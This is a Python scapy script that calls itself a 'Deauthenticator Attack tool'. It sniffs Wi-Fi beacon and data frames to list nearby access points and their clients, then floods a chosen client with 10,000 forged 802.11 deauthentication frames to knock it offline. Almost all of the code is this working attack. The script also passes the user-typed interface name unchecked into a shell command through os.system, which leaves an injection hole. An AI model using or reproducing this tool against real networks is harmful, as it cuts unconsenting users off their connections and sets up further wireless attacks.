from scapy.all import *
import os

networks= dict() #Dictionary that will store all available access points.
clients= dict()  #Dictionary that will store all available clients for each access point.
'''
steps: 
1) select interface from User
2) Run bash script to activate montior mode on selected interface
3) Scan for networks with sniff function of scapy, fill the dicts with info from sniffing
4) Display Available networks, for each network display clients with MAC address
5) Let the user choose network and and then client
6) Attack the chosen client
'''
def MonitorMode(interface): #function to turn on Monitor Mode on requested interface name
    try:
        os.system("bash monitormode.sh "+interface)
        print(interface+" is on monitor mode!")
    except:
        print("Wrong interface name, try again or make sure Monitor Mode is available.")
        sys.exit(0)

def PrintInformation(): #function to print all available networks and clients.
    os.system("clear")
    print("----Available Networks:\n")
    print("SSID\t\tMAC Address\n")
    for network in networks:
        print(str(networks[network])+"\t"+ str(network))
    print("-----------------------------------\n")
    print("----Available Clients:\n")
    print("SSID\t\tMAC Address\n")
    for client in clients:
        print(str(clients[client])+ "\t"+ str(client))
    print("-----------------------------------\n")
    print("Press Ctrl+C to stop scanning")


def PacketHandler(packet): #function to extract AP and Clients information from each packet we sniff
    #print("Sniffing.....\n")
    hasinfo=False           #Dot11 layer=  IEEE 802.11 wireless LAN layer
    if(packet.haslayer(Dot11Elt) and packet.type==0 and packet.subtype==8): #type 0 = beacon frame, subtype 8 = managment frame
        if(packet.addr2 not in networks.keys()):
            networks[packet.addr2]=packet.info.decode("utf-8") # key= source mac address, value= SSID
            hasinfo=True
    if(packet.haslayer(Dot11) and packet.getlayer(Dot11).type==2 and not packet.haslayer(EAPOL)):
        client_mac_address=packet.addr2
        ap_mac_address=packet.addr3
        if(ap_mac_address in networks.keys()):
            if(client_mac_address not in (clients.keys() or networks.keys())):
                if(client_mac_address!=ap_mac_address):
                    clients[client_mac_address]=networks[ap_mac_address] # key= client mac address, value= Network name.
                    hasinfo=True
    if(hasinfo):
        PrintInformation()

def PrintClients(network_name,network_address):
    os.system("clear")
    print("Clients for network: "+ network_name+":\n")
    for client in clients:
        if(clients[client]==networks[network_address]):
            print(client+"\n")

def Attack(interface,network_add,network_name,client):
    print("Deauthenticating client: "+client+" from: " + network_name+"\n")
    print("Press Ctrl+C to stop sending Deauth packets and exit the program")
    deauth_packet=RadioTap(present=0) / Dot11( addr1 = client, addr2 = network_add, addr3 = network_add, type=0, subtype= 12) / Dot11Deauth()
    sendp(deauth_packet, iface=interface,count=10000,inter= .2)


print("Welcome to the Deauthenticator Attack tool!\n")
interface= input("Please enter interface name, for monitor mode: ")
MonitorMode(interface)
#interface="wlxbc0f9a7bf13a" for testing
print("Starting to scan for Available networks(Access Points): ....\n")
sniff(iface=interface, prn=PacketHandler)
if(networks and clients):
    check_input=True
    while(check_input):
        chosen_network_address=input("Please insert desired network MAC address from available networks:\n")
        if(chosen_network_address in networks.keys()):
            chosen_network_name=networks[chosen_network_address]
            if(chosen_network_name != None):
                check_input=False
            else:
                print("No clients on this network, choose other network.\n")
        else:
            print("Wrong MAC address, try again.\n")

    PrintClients(chosen_network_name, chosen_network_address)
    check_input = True
    while(check_input):
        chosen_client=input("Please insert desired Client MAC address:\n")
        if(chosen_client in clients.keys()):
            check_input=False
            print("Chosen client: "+chosen_client+"\n")
            Attack(interface,chosen_network_address,chosen_network_name,chosen_client)
        else:
            print("Wrong client MAC address, please try again.\n")

else:
    print("No available networks, try to scan for longer time...")
    sys.exit(0)